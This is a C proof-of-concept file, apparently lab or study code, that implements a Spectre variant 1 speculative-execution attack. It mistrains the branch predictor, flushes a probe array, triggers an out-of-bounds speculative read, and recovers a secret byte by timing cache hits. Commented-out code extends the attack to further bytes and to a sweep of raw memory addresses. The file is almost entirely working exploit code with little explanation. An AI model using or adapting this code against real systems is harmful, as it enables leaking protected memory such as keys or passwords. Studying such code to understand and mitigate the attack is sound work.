#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#define CACHE_HIT_THRESHOLD 60

uint8_t A[10];
char *secret = "Hello!";
uint8_t B[256*64]; //side-channel (SC)
uint8_t results[256];
void victim(size_t addr){
if (((float)addr / 1.0) < 10.0){ //safety check - mispredicts
    uint8_t val = A[addr]; //accesses secret
    uint8_t x = B[val*64]; //transmits secret to SC
}
}

char attack(void* attack_addr){
//Phase 1: branch mistraining
    for (int i = 0; i < 100000; i++){ 
        victim(0);
    }
//Phase 2: initializing the side-channel
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&B[i*64]);
}
// Phase 3: running the victim
    size_t secret_offset = (void*)attack_addr - (void*)A; 
    victim(secret_offset);
//Phase 4: recovering the secret
    for (int i = 0; i < 256; i++){
            int guess = ((i * 167) + 13) & 255; // Strange Stride to trick prefetcher
            uint64_t t1 = _rdtsc(); //read timer
            uint8_t temp = B[guess*64]; //accessing the guess t2= rdtscp(); //read timer
            uint64_t t2 = _rdtsc(); //read timer
            uint64_t diff = t2-t1;
            printf("Time difference for %d: %lu \n",guess,diff);
        if (t2-t1 <= CACHE_HIT_THRESHOLD){
            results[guess] += 1; //potential secret
        }
}
char res;
    for(int i = 0; i < 256; i++){
       //printf("%d : %d \n",i,results[i]);
        if(results[i] == 1){
            res = i;
            results[i] = 0;
        }
        results[i] = 0;
    }


    return res;
}

int main(int argc, char* argv[]) {
    printf("Hello World!\n");
    printf("%p \n",A);
    char data_found = attack(secret);
   printf("Seceret Found: %c \n", data_found);
   printf("%p \n", &B[4608]);

   /* data_found = attack(secret+1);
    printf("Seceret Found: %c \n", data_found);

    data_found = attack(secret+2);
    printf("Seceret Found: %c \n", data_found);

    data_found = attack(secret+3);
    printf("Seceret Found: %c \n", data_found);

    data_found = attack(secret+4);
    printf("Seceret Found: %c \n", data_found);

    data_found = attack(secret+5);
    printf("Seceret Found: %c \n", data_found);
    /*int start_index = 4811827;
    int stop_index = 4812028+4;
    int index = start_index;
    while(index <= stop_index){
        void* addr = (void*)index; 
        data_found = attack(addr);
        index = index+1;
        printf("%x \n", data_found & 0xFF);
    }*/

    /*data_found = attack(secret+65536+1);
    printf("Seceret Found: %c \n", data_found);
    data_found = attack(secret+65536+2);
    printf("Seceret Found: %c \n", data_found);
    data_found = attack(secret+65536+3);
    printf("Seceret Found: %c \n", data_found);
    data_found = attack(secret+65536+4);
    printf("Seceret Found: %c \n", data_found);
    data_found = attack(secret+65536+5);
    printf("Seceret Found: %c \n", data_found);
    data_found = attack(secret+65536+6);
    printf("Seceret Found: %c \n", data_found);*/
    
    

    return 0;
}